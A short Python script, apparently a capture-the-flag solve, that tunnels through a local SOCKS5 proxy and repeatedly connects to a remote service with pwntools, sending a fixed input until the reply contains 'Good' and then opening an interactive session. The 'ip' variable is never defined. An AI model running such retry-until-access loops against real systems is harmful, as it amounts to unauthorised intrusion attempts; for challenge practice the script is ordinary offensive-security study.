import socks # pip install PySocks
import socket
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4444)
socket.socket = socks.socksocket
from pwn import *

while True:
    p = remote(ip,20001)
    p.sendline('00a')
    a = p.recv(1024)
    if a.find('Good') != -1:
        p.interactive()
